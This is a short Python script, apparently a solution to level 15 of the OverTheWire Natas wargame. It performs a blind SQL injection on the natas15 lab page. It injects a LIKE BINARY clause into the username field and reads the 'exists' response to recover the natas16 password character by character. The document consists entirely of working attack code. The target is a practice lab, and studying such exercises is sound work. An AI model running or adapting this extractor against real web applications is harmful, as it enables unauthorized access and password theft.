import requests
import string
from requests.auth import HTTPBasicAuth

def solve15(username, password):
    session = requests.session()
    session.auth = HTTPBasicAuth(username, password)
    session.headers["Content-Type"] = "application/x-www-form-urlencoded"
    charsInPassword = ""
    pw = ""
    for char in string.ascii_letters + "0123456789":
        resp = session.post("http://natas15.natas.labs.overthewire.org/index.php", data={"username": "natas16\" and password LIKE BINARY \"%" + char + "%\" #"})
        if "exists" in resp.text:
            charsInPassword = charsInPassword + char
    for i in range(32):
        for char in charsInPassword:
            resp = session.post("http://natas15.natas.labs.overthewire.org/index.php", data={"username": "natas16\" and password LIKE BINARY \"" + pw + char + "%\" #"})
            if "exists" in resp.text:
                print(char, end="")
                pw = pw + char
                break
    return pw